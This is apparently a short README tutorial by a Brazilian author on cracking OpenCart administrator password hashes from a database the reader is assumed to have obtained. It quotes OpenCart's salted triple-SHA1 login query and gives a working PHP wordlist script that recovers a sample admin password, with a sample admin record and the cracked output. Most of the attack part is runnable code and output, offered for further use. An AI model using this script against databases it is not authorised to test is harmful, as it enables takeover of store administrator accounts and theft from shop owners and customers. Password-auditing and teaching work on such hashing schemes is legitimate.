# Brute Force Attack In OpenCart Stored Passwords.
In this little tutorial I demonstrate how to perform a brute force attack based in word lists on passwords stored in OpenCart application databases.


## SCENERY:
- You have access to the database of an application that uses OpenCart.
- You query the Password Hash and Salt in the administrator table and you get the following result:

| password      						  | salt    | email             | status | username    | lastname | ip        | firstname |
|-----------------------------------------|---------|-------------------|--------|-------------|----------|-----------|-----------|
|f2e9efd4a366507c5b1cba7749659d93d61ae335 |oInuc412L| admin@pentest-server.com 	| 1      | Admin       | das ganbi| 127.0.0.1 | developer |


## PROBLEM:
You are not familiar with the OpenCart password encryption system, so you will try to unmask this `hash` with brute force using services that are based on simple SHA1 encryption.

```php
#exemple:

<?php
$password = "f2e9efd4a366507c5b1cba7749659d93d61ae335";

$lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
foreach($lines as $string)
{
   $hashed=SHA1($string);
   if($hashed==$password){echo "PASSWORD: ".$string;} else{}
}
?>
```


The problem is that `$ password` is not simply a string encrypted with SHA1, or MD5, or SHA1 (MD5) ... Anyway, a usual brute-force script based on these encryption templates would hardly generate a` hash` equal to `hash` that you want to 'unmask'.

## SOLUCTION:
We need to create our own script that will search the hash string in the correct form.
And what would be the correct way?

SE CHECARMOS O ARQUIVO PHP QUE FAZ A AUTENTICAÇÃO DO ADMIN NO OPENCART
`\opencart\system\library\user.php`

WE FIND THE FOLLOWING CODE:
```
$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");
```

INTERESTING PART:
```
password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "')
```

ADAPTING THE CODE WE HAVE:
```
$password=SHA1($salt.SHA1($salt.SHA1($password)));
```

**obs**: I ignored this part `OR password = '" . $this->db->escape(md5($password)) . "')` since we tested our hash and we already know that it is SHA1, right?


## Now we know how to encrypt the strings of our wordlist to compare with the hash found in the admin table.

A simple php script to test brute force on OpenCart passwords would look like this:


```php
#exemple:

<?php
$salt = "oInuc412L";
$password = "f2e9efd4a366507c5b1cba7749659d93d61ae335";

$lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
foreach($lines as $string)
{
   $hashed=SHA1($salt.SHA1($salt.SHA1($string)));
   if($hashed==$password){echo "PASSWORD: ".$string;} else{}
}
?>
```

```
C:\Users\demo\open-cript-master>php opencript.php
PASSWORD: 12345
```

## Final considerations
- the attack I did was using word list, but you can implement for other tests. Use your imagination.
- If any word is wrong do not blame me, Blame the translator. I am Brazilian.

## Fonts:
- myself

###### _NEED ME? [pablov3rlly gmail com]_
